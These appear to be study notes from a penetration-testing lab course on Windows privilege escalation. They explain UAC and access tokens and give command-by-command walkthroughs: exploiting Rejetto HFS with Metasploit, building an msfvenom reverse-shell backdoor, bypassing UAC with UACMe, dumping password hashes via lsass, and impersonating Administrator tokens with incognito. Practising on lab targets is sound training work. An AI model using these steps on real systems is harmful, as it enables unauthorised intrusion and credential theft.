### Windows Privilege Escalation
Kernel is a computer program that is the core of an operating systems and has complete control over every resource and hardware on a system it acts as a translation layer between hardware and software and facilitates the communication between these two layers

- User Mode : Programs and services running in user mode have limited access to system resources and functionality
- Kernel Mode :Kernel mode has unrestricted access to system resources and functionality with the added functionality of managing devices and system memory

### Bypassing UAC with UACMe
User account control (UAC) is a windows security feature introduced in windows vista that is used to prevent unauthorized changes from being made to the operating system 

it ensures that changes to the operating system require approval from the administrator or a user account that is part of the local administrator group 

attacks can bypass UAC in order to execute malicious executable with elevated privileges 

- u will need to have access to a user account that is a  part of a local administrators group in the windows target system (tools and techniques will depend on the version of windows running on the target)
(UACMe is an open source robuse privliege escalation tool developed by @hfire0x it can be used to bypass windows uac by laveraging various techniques )

#### UAC Bypass: UACMe Lab
check the target ip
- cat /root/Desktop/target
run nmap scan against  the target ip
- nmap ip
nmap version scan on the target ip
- nmap -sV -p80 ip
search exploit by using searchsploit module
- searchsploit hfs
run rejetto http file server is vulnerable to RCE with meterpreter session
- msfconsole 
- use exploit/windows/http/rejetto_hfs_exec
- set RHOSTS ip
- exploit
check the current user > admin user
- getuid
- sysinfo
migrate the process in explorere.exe with PID number
- ps -S explorer.exe
- migrate (PID number)
elevate to the high privilege (u could see u don`t have permission to elevate privileges)
- getsystem
get windows shell
- shell
- net localgroup administrators
generate malicious executable using msfvenom and running it on the target machine to gain administrator use privlieges
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > 'backdoor.exe'
- the tool located in /root/Desktop/tools/UACME
- CTRL + C
cd C:\\Users\\admin\\AppData\\Local\\Temp
upload /root/Desktop/tools/UACME/Akagi64.exe .
upload /root/backdoor.exe .
ls

- msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.1.3
set LPORT 4444
exploit
- shell
- ps -S lsass.exe
- migrate (PID number)
- hashdump

### Access Token Impersonation
windows access tokens are core elements of the authentication process on windows and are created and managed by the local security authority subsystem service (LSASS)

- windows access token is responsible for identifying and describing the security context of a process of thread running on a system simply put an access token can be thought of as a temporary key akin to a web cookie that provides users with access to a system or network resource without having to provide credentials each time a process is started or a system resource is accessed

- impersonate level-tokens : are created as a direct result of non interactive login on windows typically through specific system services or domain logons

- delegate level tokens are typically created through an interactive login on windows primarily  through a traditional login or through remote access protocols such as RDP 
- impersonate-level tokens can be used to impersonate a token on the local system and not on any external systems that utilize the token
- delegate-level tokens pose the largest threat as they can be used to impersonate tokens on any system

Windows Privileges
the process of impersonating access tokens to elevate privileges on a system will primarily depends on the privileges assigned to the account that has been exploited to gain initial access as well as the impersonation or delegation tokens available

- SeAssignPrimaryToken : this allow user to impersonate tokens
- SecreateToken : this allow a user to create an arbitrary token with administrative privileges
- SelmpersonatePrivilege : this allow a user to create a process under the security context of another user typically with administrative privileges

incognito module is a buit-in meterpreter module that was originally a standalone application that allow you to impersonate user tokens after successful exploitation


#### Privilege Escalation: Impersonate Lab
	nmap ip
	nmap -sV -p80 ip
	searchsploit hfs
	msfconsole -q
	use exploit/windows/http/rejetto_hfs_exec
	set RHOSTS ip
	exploit
	getuid
	cat C:\\Users\\Administrator\\Desktop\\flag.txt
	load incognito
	list_tokens -u
	impersonate_token ATTACKDEFENSE\\Administrator 
	getuid
	cat C:\\Users\\Administrator\\Desktop\\flag.txt
	